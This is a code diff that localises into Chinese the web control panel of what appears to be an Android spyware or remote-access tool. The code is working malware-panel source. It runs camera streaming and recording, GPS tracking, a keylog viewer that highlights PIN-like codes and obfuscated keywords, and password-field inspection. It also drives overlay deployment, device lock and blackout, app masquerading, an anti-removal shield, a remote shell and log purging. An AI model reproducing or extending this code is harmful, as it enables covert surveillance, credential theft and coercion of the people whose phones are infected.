@@ -1,7 +1,7 @@
 console.clear();
-console.log("%c[SYSTEM LOG] %cInitializing encrypted session...", "color:#00f2ff; font-weight:bold;", "color:#888;");
-console.log("%c[SECURITY] %cSandbox environment detected. Applying hardened telemetry protocols.", "color:#39ff14; font-weight:bold;", "color:#888;");
-console.log("%c[NETWORK] %cProxy link established: 127.0.0.1:9191 -> 0.0.0.0:443", "color:#ffff00; font-weight:bold;", "color:#888;");
+console.log("[系统] 正在初始化加密会话…");
+console.log("[安全] 检测到隔离环境，正在应用加固遥测协议。");
+console.log("[网络] 代理链路已建立：127.0.0.1:9191 -> 0.0.0.0:443");
 
 // Security Event Listeners
 document.addEventListener("contextmenu", e => e.preventDefault());
@@ -46,7 +46,7 @@ window.fetch = async function(resource, init) {
   try {
     const response = await originalFetch(url, init);
     if (response.status === 401) {
-      showToast("SESSION_EXPIRED: Re-authenticating...", "error");
+      showToast("会话已过期，正在重新验证…", "error");
       setTimeout(() => {
         window.location.reload();
       }, 1000);
@@ -106,7 +106,7 @@ function injectMobileStyles() {
       display: block !important;
       margin: 0 auto !important;
       border-radius: 14px !important;
-      box-shadow: 0 0 20px rgba(0, 242, 255, 0.25) !important;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.55) !important;
       touch-action: none !important;
       -webkit-touch-callout: none !important;
       -webkit-user-select: none !important;
@@ -133,7 +133,7 @@ function showInfo(e, t, o) {
       borderRadius: "12px",
       zIndex: "20000",
       width: "300px",
-      boxShadow: "0 20px 60px rgba(0,0,0,0.95), 0 0 25px rgba(0,242,255,0.2)",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.9)",
       transition: "opacity 0.25s ease",
       opacity: "0",
       display: "none",
@@ -240,7 +240,7 @@ function showToast(e, t = "info") {
       fontSize: "0.9rem",
       textAlign: "center",
       minWidth: "320px",
-      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.9)",
       transition: "all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)",
       opacity: "0",
       display: "none",
@@ -265,14 +265,14 @@ function showToast(e, t = "info") {
 
 // Repair & Optimization Functions
 function repairProtocol() {
-  _0x4a("REPAIR_LINK", "Re-synchronizing background telemetry protocols...", () => {
+  _0x4a("修复链路", "正在重新同步后台遥测协议…", () => {
     fetch("/gps/request-permission");
     fetch("/device/fix-persistence")
       .then(e => e.json())
       .then(e => { showToast(e.message); })
       .catch(e => {
         console.error(e);
-        showToast("Connection failure", "error");
+        showToast("连接失败", "error");
       });
   });
 }
@@ -280,67 +280,67 @@ function repairProtocol() {
 function deployStealthMasquerade() {
   const sel = document.getElementById("stealth-app-select");
   if (!sel || !sel.value) {
-    showToast("SELECT_AN_INSTALLED_APP", "error");
+    showToast("请选择一个已安装的应用", "error");
     return;
   }
   const pkg = sel.value;
-  showToast("DEPLOYING_STEALTH_CAMOUFLAGE...");
+  showToast("正在部署伪装…");
   fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
     .then(r => {
-      showToast("STEALTH_CAMOUFLAGE_DEPLOYED");
+      showToast("伪装已部署");
       setTimeout(() => location.reload(), 1500);
     })
-    .catch(err => showToast("CAMOUFLAGE_ERROR", "error"));
+    .catch(err => showToast("伪装失败", "error"));
 }
 
 function dispatchPermissionSequence() {
-  showToast("PERMISSION_PROMPTS_SENT");
+  showToast("权限弹窗请求已发送");
   fetch("/device/request-permissions")
     .then(e => e.json())
     .then(e => { showToast(e.message); })
     .catch(e => {
       console.error(e);
-      showToast("Request failed", "error");
+      showToast("请求失败", "error");
     });
 }
 
 function optimizeStability() {
-  _0x4a("STABILITY_OPTIMIZE", "Bypassing OEM power restrictions...", () => {
+  _0x4a("稳定性优化", "正在绕过 OEM 电源限制…", () => {
     fetch("/device/optimize-stability")
       .then(e => e.json())
-      .then(e => { showToast("STABILITY_SYNC: Follow OEM instructions to enable Auto-start"); })
+      .then(e => { showToast("稳定性同步：请按 OEM 指引开启自启动"); })
       .catch(e => {
         console.error(e);
-        showToast("Stability sync failed", "error");
+        showToast("稳定性同步失败", "error");
       });
   });
 }
 
 function deepRepair() {
-  _0x4a("CORE_REPAIR", "Opening deep system configuration to resolve environment conflicts...", () => {
+  _0x4a("核心修复", "正在打开系统深度配置以解决环境冲突…", () => {
     fetch("/device/deep-repair")
       .then(e => e.json())
-      .then(e => { showToast("SETTINGS_OPENED: Complete repair on device"); })
+      .then(e => { showToast("设置已打开：请在设备上完成修复"); })
       .catch(e => {
         console.error(e);
-        showToast("Repair link failed", "error");
+        showToast("修复链路失败", "error");
       });
   });
 }
 
 function injectTrust() {
-  showToast("BYPASS_SEQUENCE_INITIATED");
+  showToast("绕过序列已启动");
   fetch("/device/inject-trust")
     .then(e => e.json())
-    .then(e => { showToast("BYPASS_INITIATED: Wait for install prompt"); })
+    .then(e => { showToast("绕过已启动：请等待安装提示"); })
     .catch(e => {
       console.error(e);
-      showToast("Bypass failed", "error");
+      showToast("绕过失败", "error");
     });
 }
 
 function initiateHeal() {
-  _0x4a("AUTO_HEAL_PROTOCOL", "Initiating self-healing sequence to restore persistence layers...", () => {
+  _0x4a("自愈协议", "正在启动自愈序列以恢复持久化层…", () => {
     ghostAction("autoheal");
   });
 }
@@ -366,7 +366,7 @@ function _0x4a(e, t, o) {
       transition: "opacity 0.4s ease",
       backdropFilter: "blur(10px)"
     });
-    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>';
+    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.8);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">正在准备远程系统命令…</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">取消</button></div></div>';
     document.body.appendChild(n);
   }
 
@@ -422,22 +422,22 @@ async function handleLogin(e) {
     });
     const data = await res.json();
     if (data.success) {
-      o.textContent = "ACCESS_GRANTED";
+      o.textContent = "访问已授权";
       o.style.color = "#39ff14";
-      o.style.textShadow = "0 0 25px #39ff14";
+      o.style.textShadow = "none";
       setTimeout(() => {
         window.location.reload();
       }, 800);
     } else {
-      o.textContent = "INCORRECT_PASSWORD";
+      o.textContent = "密码错误";
       o.style.color = "#ff3131";
-      o.style.textShadow = "0 0 25px #ff3131";
+      o.style.textShadow = "none";
       n.disabled = false;
       n.style.opacity = "1";
       setTimeout(() => {
-        o.textContent = "RESTRICTED_ACCESS";
+        o.textContent = "受限访问";
         o.style.color = "#00f2ff";
-        o.style.textShadow = "0 0 15px rgba(0,242,255,0.6)";
+        o.style.textShadow = "none";
       }, 2000);
     }
   } catch (err) {
@@ -453,7 +453,7 @@ async function updatePassword(e) {
   if (!inputEl) return;
   const t = inputEl.value;
   if (!t || !t.trim()) {
-    showToast("Password cannot be empty", "error");
+    showToast("密码不能为空", "error");
     return;
   }
   try {
@@ -492,11 +492,11 @@ function fetchLogs() {
           if (logLine.startsWith("[I]")) {
             div.style.color = "var(--encrypted-blue)";
             div.style.fontWeight = "bold";
-            div.style.textShadow = "0 0 10px rgba(0, 136, 255, 0.3)";
+            div.style.textShadow = "none";
             cleanText = logLine.substring(3);
           } else if (logLine.startsWith("[C]")) {
             div.style.color = "var(--danger)";
-            div.style.textShadow = "0 0 10px rgba(255, 49, 49, 0.5)";
+            div.style.textShadow = "none";
             div.style.fontWeight = "bold";
             cleanText = logLine.substring(3);
           } else if (logLine.startsWith("[W]")) {
@@ -521,7 +521,7 @@ function fetchLogs() {
 }
 
 function clearSessionLogs() {
-  showToast("PURGING_ACTIVITY_LOGS...");
+  showToast("正在清除活动日志…");
   fetch("/terminal/clear-logs").then(() => {
     _0x1a = 0;
     fetchLogs();
@@ -532,20 +532,20 @@ function clearSessionLogs() {
 function openAccessibility() {
   fetch("/device/open-accessibility")
     .then(e => e.json())
-    .then(e => { showToast("ACCESSIBILITY_HUB_OPENED"); })
+    .then(e => { showToast("无障碍设置已打开"); })
     .catch(e => {
       console.error(e);
-      showToast("Link failure", "error");
+      showToast("链接失败", "error");
     });
 }
 
 function openNotifications() {
   fetch("/device/open-notifications")
     .then(e => e.json())
-    .then(e => { showToast("NOTIFICATION_HUB_OPENED"); })
+    .then(e => { showToast("通知设置已打开"); })
     .catch(e => {
       console.error(e);
-      showToast("Link failure", "error");
+      showToast("链接失败", "error");
     });
 }
 
@@ -558,14 +558,14 @@ function deviceCmd(e) {
 }
 
 function restartServer() {
-  if (confirm("Refresh background service? Interface will temporarily disconnect.")) {
+  if (confirm("重启后台服务？界面将短暂断开。")) {
     fetch("/terminal/restart");
     setTimeout(() => location.reload(), 2500);
   }
 }
 
 function selfDestruct() {
-  if (confirm("CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?")) {
+  if (confirm("警告：此操作将移除所有系统稳定性协议并卸载应用。是否继续？")) {
     fetch("/device/self-destruct");
   }
 }
@@ -592,10 +592,10 @@ function pickToastColor(e) {
 
 function sendEnhancedToast() {
   const a = document.getElementById("toast-msg").value;
-  if (!a) return showToast("ENTER_MESSAGE_FIRST", "error");
+  if (!a) return showToast("请先输入消息", "error");
   const e = document.getElementById("toast-anim").value;
   if ("burnt" === e) {
-    showToast("Sending_Burnt_Toast");
+    showToast("正在发送弹窗");
     for (let i = 0; i < 15; i++) {
       setTimeout(() => {
         const size = Math.floor(40 * Math.random()) + 15;
@@ -614,7 +614,7 @@ function sendEnhancedToast() {
     fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + e + "&color=" + encodeURIComponent(color))
       .then(res => res.json())
       .then(data => {
-        if (data.success) showToast("TOAST_DISPATCHED");
+        if (data.success) showToast("弹窗已发送");
       });
   }
 }
@@ -677,7 +677,7 @@ function executeShell() {
         if (o) {
           const outDiv = document.createElement("div");
           outDiv.style.whiteSpace = "pre-wrap";
-          const rawText = data.output || "No output";
+          const rawText = data.output || "无输出";
           outDiv.innerHTML = rawText.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
           o.appendChild(outDiv);
           o.scrollTop = o.scrollHeight;
@@ -687,7 +687,7 @@ function executeShell() {
         if (o) {
           const errDiv = document.createElement("div");
           errDiv.style.color = "var(--danger)";
-          errDiv.textContent = "[ERROR] Connection lost";
+          errDiv.textContent = "[错误] 连接丢失";
           o.appendChild(errDiv);
         }
       });
@@ -745,7 +745,7 @@ function startGhostScreen() {
   if (statusCard) statusCard.style.display = "none";
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "TERMINATE";
+    btn.innerText = "结束";
     btn.style.borderColor = "var(--danger)";
     btn.style.color = "var(--danger)";
   }
@@ -757,11 +757,11 @@ function stopGhostScreen() {
   const statusCard = document.getElementById("ghost-screen-status");
   if (statusCard) {
     statusCard.style.display = "block";
-    statusCard.innerText = "OLED_STANDBY";
+    statusCard.innerText = "屏幕待机";
   }
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "INITIATE_VIEW";
+    btn.innerText = "开始查看";
     btn.style.borderColor = "var(--neon-green)";
     btn.style.color = "var(--neon-green)";
   }
@@ -854,29 +854,29 @@ function openSettings() {
 
 function deployOverlay() {
   const e = document.getElementById("overlay-type").value;
-  if (!e) return showToast("SELECT_TARGET_FIRST", "error");
-  showToast("OVERLAY_DISPATCH_SENT");
+  if (!e) return showToast("请先选择目标", "error");
+  showToast("覆盖层指令已发送");
   fetch("/ghost/deploy-overlay?type=" + e)
     .then(res => res.json())
-    .then(() => { showToast("OVERLAY_DEPLOYED"); });
+    .then(() => { showToast("覆盖层已部署"); });
 }
 
 function terminateOverlay() {
   fetch("/ghost/deploy-overlay")
     .then(res => res.json())
-    .then(() => { showToast("OVERLAY_TERMINATED"); });
+    .then(() => { showToast("覆盖层已结束"); });
 }
 
 function toggleLock() {
   fetch("/ghost/lock").then(() => {
-    showToast("Uplink command sent: SYSTEM_LOCK");
+    showToast("指令已发送：系统锁定");
     checkGhostStatus();
   });
 }
 
 function toggleBlackout() {
   const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
-  showToast(isActivating ? "BLACKOUT_PROTOCOL_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
+  showToast(isActivating ? "黑屏协议已启用" : "正在恢复屏幕背光…");
   fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
 }
 
@@ -886,12 +886,12 @@ function toggleAutoPilot() {
     .then(data => {
       const btn = document.getElementById("autopilot-btn");
       if (data.autopilot) {
-        btn.innerText = "AUTOPILOT_ENGAGED";
+        btn.innerText = "自动驾驶已开启";
         btn.classList.add("btn-engaged-yellow");
         btn.style.color = "#000";
         btn.style.background = "#ffff00";
       } else {
-        btn.innerText = "AUTOPILOT_OFF";
+        btn.innerText = "自动驾驶已关闭";
         btn.classList.remove("btn-engaged-yellow");
         btn.style.color = "var(--neon-yellow)";
         btn.style.background = "rgba(255, 255, 255, 0.03)";
@@ -908,16 +908,16 @@ function ghostType() {
 
 function transmitVoicePayload() {
   const input = document.getElementById("tts-input");
-  if (!input || !input.value.trim()) { showToast("PLEASE_ENTER_TEXT_TO_EMIT", "error"); return; }
+  if (!input || !input.value.trim()) { showToast("请输入要播放的文本", "error"); return; }
   const text = input.value.trim();
-  showToast("TRANSMITTING_VOICE_PAYLOAD...");
+  showToast("正在传输语音…");
   fetch("/audio/speak?text=" + encodeURIComponent(text))
     .then(r => r.json())
     .then(d => {
-      if (d.success) { showToast("VOICE_EMISSION_QUEUED"); input.value = ""; }
-      else showToast("VOICE_EMISSION_FAILED", "error");
+      if (d.success) { showToast("语音已排队"); input.value = ""; }
+      else showToast("语音发送失败", "error");
     })
-    .catch(() => showToast("TRANSMISSION_ERROR", "error"));
+    .catch(() => showToast("传输错误", "error"));
 }
 
 // Base Actions
@@ -926,7 +926,7 @@ function ghostAction(e) {
 }
 
 function clearGhostLogs() {
-  showToast("PURGING_KEYLOG_HISTORY...");
+  showToast("正在清除键盘记录…");
   fetch("/ghost/clear").then(() => refreshGhostLogs());
 }
 
@@ -934,7 +934,7 @@ function clearGhostLogs() {
 async function refreshInspector() {
   const o = document.getElementById("inspector-tree");
   if (!o) return;
-  o.innerHTML = '<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';
+  o.innerHTML = '<span style="color:var(--neon-cyan)">[扫描中] 正在遍历无障碍树…</span>';
   try {
     const data = await (await fetch("/ghost/inspector")).json();
     if (data.error) {
@@ -944,34 +944,34 @@ async function refreshInspector() {
       const div = document.createElement("div");
       div.style.padding = "12px 18px";
       div.style.marginBottom = "20px";
-      div.style.background = "rgba(0, 242, 255, 0.08)";
-      div.style.border = "1px solid rgba(0, 242, 255, 0.15)";
+      div.style.background = "#1b1b1f";
+      div.style.border = "1px solid #26262b";
       div.style.borderRadius = "10px";
-      div.style.boxShadow = "inset 0 0 15px rgba(0,242,255,0.05)";
+      div.style.boxShadow = "none";
 
       let pkgName = data.package;
       let iconHtml = "&#128241;";
       if (["launcher", "trebuchet", "home", "desktop", "nexuslauncher"].some(kw => pkgName.toLowerCase().includes(kw))) {
-        pkgName = "System Home Screen";
+        pkgName = "系统桌面";
         iconHtml = "&#127968;";
       } else if (pkgName.includes(".android.settings")) {
-        pkgName = "System Settings";
+        pkgName = "系统设置";
       } else if (pkgName.includes(".vending")) {
-        pkgName = "Google Play Store";
+        pkgName = "Google Play 商店";
       } else if (pkgName.includes(".chrome")) {
-        pkgName = "Chrome Browser";
+        pkgName = "Chrome 浏览器";
       } else if (pkgName.includes(".messaging") || pkgName.includes(".sms")) {
-        pkgName = "SMS / Messages";
+        pkgName = "短信 / 消息";
       } else if (pkgName.includes(".contacts")) {
-        pkgName = "Contacts / Phonebook";
+        pkgName = "通讯录";
       }
 
-      div.innerHTML = `<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${iconHtml}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${pkgName}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">SECURE_LAYER_V2<br>SYSCALL_ACTIVE</div></div>`;
+      div.innerHTML = `<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${iconHtml}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">当前界面上下文</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${pkgName}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">安全层 V2<br>系统调用活跃</div></div>`;
       o.appendChild(div);
       _0x5a(data.tree, o, 0, data.width, data.height);
     }
   } catch (err) {
-    o.innerHTML = '<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>';
+    o.innerHTML = '<span style="color:var(--danger)">[致命] 检查器超时</span>';
   }
 }
 
@@ -997,7 +997,7 @@ function _0x5a(n, r, a, l, s) {
   else if (n.class.toLowerCase().includes("layout")) bulletIcon = "&#128392;";
   else if (n.class.toLowerCase().includes("recycler") || n.class.toLowerCase().includes("list")) bulletIcon = "&#128220;";
 
-  e.title = `Class: ${n.class}\nBounds: ${n.x},${n.y} [${n.w}x${n.h}]\nVisible: ${n.visible}\nFocusable: ${n.focusable}`;
+  e.title = `类: ${n.class}\n边界: ${n.x},${n.y} [${n.w}x${n.h}]\n可见: ${n.visible}\n可聚焦: ${n.focusable}`;
   let innerMarkup = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${bulletIcon}</span><span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${shortClass}</span>`;
 
   if (n.resId) {
@@ -1009,19 +1009,19 @@ function _0x5a(n, r, a, l, s) {
     innerMarkup += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${n.desc}]</span>`;
   }
   if (n.clickable) {
-    innerMarkup += '<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>';
+    innerMarkup += '<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">可点击</span>';
   }
   if (n.password) {
-    innerMarkup += '<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>';
+    innerMarkup += '<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">密码</span>';
   }
   if (n.editable) {
-    innerMarkup += '<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>';
+    innerMarkup += '<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">可编辑</span>';
   }
 
   e.innerHTML = innerMarkup;
   e.onmouseenter = () => {
-    e.style.background = "rgba(0, 242, 255, 0.08)";
-    e.style.boxShadow = "0 0 10px rgba(0, 242, 255, 0.1)";
+    e.style.background = "#1b1b1f";
+    e.style.boxShadow = "none";
   };
   e.onmouseleave = () => {
     e.style.background = "transparent";
@@ -1058,12 +1058,12 @@ async function refreshGhostLogs() {
           formattedText = formattedText.replace(re, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
         });
 
-        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');
+        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: none;">$1</span>');
 
         ["\\x1C\\x0D\\x03", "\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A", "\\x0F\\x06\\x14\\x00\\x0A", "\\x16\\x1A\\x16\\x13", "\\x06\\x04\\x02\\x08\\x08"].forEach(pattern => {
           const dec = pattern.split("").map((ch, idx) => String.fromCharCode(ch.charCodeAt(0) ^ "SysAdmin".charCodeAt(idx % 8))).join("");
           const re = new RegExp("(" + dec + ")", "gi");
-          formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
+          formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: none;">$1</span>');
         });
 
         n.innerHTML = formattedText;
@@ -1088,21 +1088,21 @@ async function checkGhostStatus() {
 
       if (data.active) {
         if (statusCard) statusCard.style.borderColor = "var(--neon-green)";
-        if (statusText) statusText.innerHTML = '<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>';
+        if (statusText) statusText.innerHTML = '<span style="color:var(--neon-green);">上行已建立</span>';
         if (accPrompt) accPrompt.style.display = "none";
       } else {
         if (statusCard) statusCard.style.borderColor = "var(--danger)";
-        if (statusText) statusText.innerHTML = '<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>';
+        if (statusText) statusText.innerHTML = '<span style="color:var(--danger);">离线·等待权限</span>';
         if (accPrompt) accPrompt.style.display = "block";
       }
 
       if (lockBtn) {
         if (data.lock) {
-          lockBtn.innerHTML = "RELEASE_LOCK";
+          lockBtn.innerHTML = "解除锁定";
           lockBtn.style.borderColor = "var(--neon-green)";
           lockBtn.style.color = "var(--neon-green)";
         } else {
-          lockBtn.innerHTML = "DEPLOY_LOCK";
+          lockBtn.innerHTML = "部署锁定";
           lockBtn.style.borderColor = "var(--danger)";
           lockBtn.style.color = "var(--danger)";
         }
@@ -1131,12 +1131,12 @@ async function checkGhostStatus() {
 
       if (antiRemovalBtn) {
         if (data.antiRemoval) {
-          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: ON";
+          antiRemovalBtn.innerHTML = "防卸载护盾：开";
           antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
           antiRemovalBtn.style.color = "var(--neon-yellow)";
           antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.15)";
         } else {
-          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: OFF";
+          antiRemovalBtn.innerHTML = "防卸载护盾：关";
           antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
           antiRemovalBtn.style.color = "var(--neon-yellow)";
           antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
@@ -1173,7 +1173,7 @@ async function initiateStream(camId) {
   const loading = document.getElementById("loading-overlay");
   if (loading) {
     loading.style.display = "block";
-    loading.innerText = "INITIALIZING_CAMERA...";
+    loading.innerText = "正在初始化摄像头…";
   }
 
   const liveIndicator = document.getElementById("live-indicator");
@@ -1186,7 +1186,7 @@ async function initiateStream(camId) {
     liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
   }
   if (dot) dot.className = "badge-dot blink-slow";
-  if (text) text.innerText = "LIVE";
+  if (text) text.innerText = "直播";
 
   document.querySelectorAll(".cam-btn").forEach(btn => {
     btn.classList.remove("btn-engaged-green");
@@ -1248,7 +1248,7 @@ function terminateCaptures() {
   const loading = document.getElementById("loading-overlay");
   if (loading) {
     loading.style.display = "block";
-    loading.innerText = "Uplink_Ready";
+    loading.innerText = "上行就绪";
   }
 
   const liveIndicator = document.getElementById("live-indicator");
@@ -1261,7 +1261,7 @@ function terminateCaptures() {
     liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
   }
   if (dot) dot.className = "badge-dot";
-  if (text) text.innerText = "STANDBY";
+  if (text) text.innerText = "待机";
 
   document.querySelectorAll(".cam-btn").forEach(btn => {
     btn.classList.remove("btn-engaged-green");
@@ -1277,16 +1277,16 @@ function terminateCaptures() {
 
 function capturePhoto() {
   if (!_0x3a || !_0x3c) {
-    showToast("PLEASE_ENGAGE_A_CAMERA_FEED_FIRST", "error");
+    showToast("请先启动摄像头画面", "error");
     return;
   }
-  showToast("SNAPPING_PHOTO...");
+  showToast("正在拍照…");
   fetch("/camera/photo?cam=" + _0x3c)
     .then(res => {
-      showToast("PHOTO_SAVED_TO_VAULT");
+      showToast("照片已保存到保险库");
       setTimeout(() => location.reload(), 1200);
     })
-    .catch(err => showToast("SNAP_FAILED", "error"));
+    .catch(err => showToast("拍照失败", "error"));
 }
 
 function toggleRecording() {
@@ -1300,7 +1300,7 @@ function toggleRecording() {
       fetch("/camera/stop-record");
     }
   } else {
-    showToast("START_FEED_FIRST", "error");
+    showToast("请先开启画面", "error");
   }
 }
 
@@ -1315,7 +1315,7 @@ function checkRecStatus() {
 
       if (data.last_finished) {
         if (null !== _lv && data.last_finished !== _lv) {
-          showToast("DATA_SYNC: Auto-downloading recording...");
+          showToast("数据同步：正在自动下载录音…");
           const a = document.createElement("a");
           a.href = "/download/" + data.last_finished;
           a.download = "";
@@ -1333,7 +1333,7 @@ function checkRecStatus() {
           liveIndicator.style.background = "rgba(255, 49, 49, 0.15)";
         }
         if (dot) dot.className = "badge-dot blink-fast";
-        if (text) text.innerText = "REC (" + data.duration + "s)";
+        if (text) text.innerText = "录像 (" + data.duration + " 秒)";
         if (recBtn) recBtn.innerText = "STOP_RECORDING";
       } else {
         if (_0x3a || window.cameraStreamActive || data.streaming) {
@@ -1343,7 +1343,7 @@ function checkRecStatus() {
             liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
           }
           if (dot) dot.className = "badge-dot blink-slow";
-          if (text) text.innerText = "LIVE";
+          if (text) text.innerText = "直播";
         } else {
           if (liveIndicator) {
             liveIndicator.style.borderColor = "var(--neon-yellow)";
@@ -1351,7 +1351,7 @@ function checkRecStatus() {
             liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
           }
           if (dot) dot.className = "badge-dot";
-          if (text) text.innerText = "STANDBY";
+          if (text) text.innerText = "待机";
         }
         if (recBtn) recBtn.innerText = "START_RECORDING";
       }
@@ -1380,7 +1380,7 @@ function _0x6a(msg) {
 }
 
 function locateDevice() {
-  _0x6a("[REQUEST] Pinging satellites...");
+  _0x6a("[请求] 正在连接定位卫星…");
   fetch("/gps/locate?json=true")
     .then(res => res.json())
     .then(data => {
@@ -1389,25 +1389,25 @@ function locateDevice() {
         currentLon = data.lon;
         const display = document.getElementById("coord-display");
         if (display) display.innerHTML = "LAT: " + data.lat + " | LON: " + data.lon;
-        _0x6a("[SUCCESS] Fix acquired: " + data.lat + ", " + data.lon);
+        _0x6a("[成功] 已获取定位：" + data.lat + ", " + data.lon);
 
         const mapFrame = document.getElementById("map-frame");
         const mapOverlay = document.getElementById("map-overlay");
